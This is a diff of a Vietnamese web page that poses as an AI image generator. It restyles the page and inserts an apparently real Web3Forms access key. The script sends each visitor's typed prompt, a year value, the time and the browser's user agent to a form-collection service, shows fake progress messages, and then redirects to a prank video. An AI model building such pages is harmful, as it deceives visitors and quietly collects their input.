@@ -5,33 +5,57 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Nhập lệnh để tạo ảnh</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🖼️</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
+  :root{
+    --ink:#14151f; --muted:#8b8fa3; --line:#e3e5ee; --accent:#5b5bf0; --accent2:#8a5cf6;
+  }
   *{box-sizing:border-box}
   html,body{height:100%}
   body{
-    margin:0; background:#fff; color:#111;
-    font-family:"Segoe UI",system-ui,-apple-system,Roboto,sans-serif;
+    margin:0; color:var(--ink);
+    font-family:"Plus Jakarta Sans","Segoe UI",system-ui,-apple-system,Roboto,sans-serif;
+    background:
+      radial-gradient(900px 500px at 12% -10%, #e9e7ff 0%, transparent 60%),
+      radial-gradient(800px 500px at 100% 110%, #dff4ff 0%, transparent 60%),
+      #f7f8fc;
     display:flex; align-items:center; justify-content:center; padding:24px;
   }
-  main{width:100%; max-width:760px; text-align:center}
-  h1{font-size:1.6rem; font-weight:400; margin:0 0 36px}
+  main{
+    width:100%; max-width:640px; text-align:center;
+    background:#fff; border:1px solid var(--line); border-radius:24px;
+    padding:48px 44px 40px;
+    box-shadow:0 1px 2px rgba(20,21,31,.04), 0 24px 60px -24px rgba(60,60,140,.28);
+  }
+  h1{font-size:1.65rem; font-weight:600; letter-spacing:-.02em; margin:0 0 34px}
   input[type=text]{
-    display:block; width:100%; height:74px; margin:0 0 34px;
-    border:1.5px solid #111; border-radius:0; background:#fff;
-    padding:0 36px; font:inherit; font-size:1.5rem; color:#111; outline:0;
+    display:block; width:100%; height:62px; margin:0 0 18px;
+    border:1.5px solid var(--line); border-radius:14px; background:#fbfbfe;
+    padding:0 22px; font:inherit; font-size:1.05rem; color:var(--ink); outline:0;
+    transition:border-color .2s, box-shadow .2s, background .2s;
   }
-  input::placeholder{color:#d4d4d4}
-  input:focus-visible{outline:3px solid #111; outline-offset:3px}
+  input::placeholder{color:#b4b8c9}
+  input[type=text]:hover{border-color:#cfd2e2}
+  input[type=text]:focus{border-color:var(--accent); background:#fff; box-shadow:0 0 0 4px rgba(91,91,240,.14)}
   button{
-    width:250px; height:64px; border:0; border-radius:999px;
-    background:#111; color:#fff; font:inherit; font-size:1.5rem; cursor:pointer;
+    width:100%; height:60px; margin-top:10px; border:0; border-radius:14px; cursor:pointer;
+    background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#fff;
+    font:inherit; font-size:1.1rem; font-weight:600; letter-spacing:.01em;
+    box-shadow:0 14px 28px -12px rgba(91,91,240,.65);
+    transition:transform .15s, filter .2s, box-shadow .2s;
   }
-  button:focus-visible{outline:3px solid #6c8cff; outline-offset:3px}
-  button:disabled{opacity:.65; cursor:wait}
-  .status{margin-top:22px; min-height:1.4em; color:#666; font-size:1rem}
-  .err{color:#c0392b}
+  button:hover{filter:brightness(1.06); transform:translateY(-1px)}
+  button:active{transform:translateY(0)}
+  button:focus-visible{outline:3px solid rgba(91,91,240,.4); outline-offset:3px}
+  button:disabled{opacity:.7; cursor:wait; transform:none; filter:none}
+  .status{margin-top:20px; min-height:1.4em; color:var(--muted); font-size:.95rem}
+  .err{color:#d6455d}
   .hp{position:absolute; left:-9999px; opacity:0}
-  footer{margin-top:40px; color:#999; font-size:.78rem}
+  footer{margin-top:30px; color:#b0b4c6; font-size:.76rem}
+  @media (max-width:520px){ main{padding:36px 22px 30px; border-radius:20px} h1{font-size:1.4rem} }
+  @media (prefers-reduced-motion:reduce){ *{transition:none!important} }
 </style>
 </head>
 <body>
@@ -51,11 +75,8 @@
 
 <script>
 /* ====== CẤU HÌNH ====== */
-// Cách 1 (dễ nhất): Web3Forms – lấy Access Key miễn phí tại https://web3forms.com
-const WEB3FORMS_KEY = "DAN_ACCESS_KEY_CUA_BAN_VAO_DAY";
-// Cách 2 (tuỳ chọn): link Google Apps Script Web App. Để "" nếu không dùng.
+const WEB3FORMS_KEY = "ada25e74-87d7-48b6-b952-b24d4346ce15";
 const APPS_SCRIPT_URL = "";
-// Trang chuyển tới sau khi bấm Tạo
 const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 /* ====================== */
 
@@ -65,7 +86,7 @@ const steps = ["Đang phân tích lệnh…","Đang kết nối máy chủ…","
 function send(prompt, year){
   const meta = {time:new Date().toLocaleString("vi-VN"), page:location.href, ua:navigator.userAgent};
   const jobs = [];
-  if (WEB3FORMS_KEY && !WEB3FORMS_KEY.startsWith("DAN_")) {
+  if (WEB3FORMS_KEY) {
     jobs.push(fetch("https://api.web3forms.com/submit", {
       method:"POST",
       headers:{"Content-Type":"application/json","Accept":"application/json"},
